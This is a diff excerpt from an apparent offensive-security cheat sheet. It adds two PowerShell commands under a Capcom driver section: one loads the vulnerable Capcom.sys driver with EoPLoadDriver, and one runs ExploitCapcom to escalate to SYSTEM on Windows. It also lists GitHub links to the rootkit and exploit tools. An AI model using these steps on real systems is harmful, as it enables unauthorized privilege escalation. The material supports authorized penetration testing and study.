@@ -842,6 +842,11 @@ https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
 https://github.com/TarlogicSecurity/EoPLoadDriver/
 https://github.com/musheebat/Compiled-capcom-exploit
 
+```powershell
+.\EoPLoadDriver.exe System\CurrentControlSet\Capcom .\Capcom.sys
+.\ExploitCapcom.exe
+```
+
 ### S4U
 #### Rubeus
 https://github.com/Kevin-Robertson/Powermad
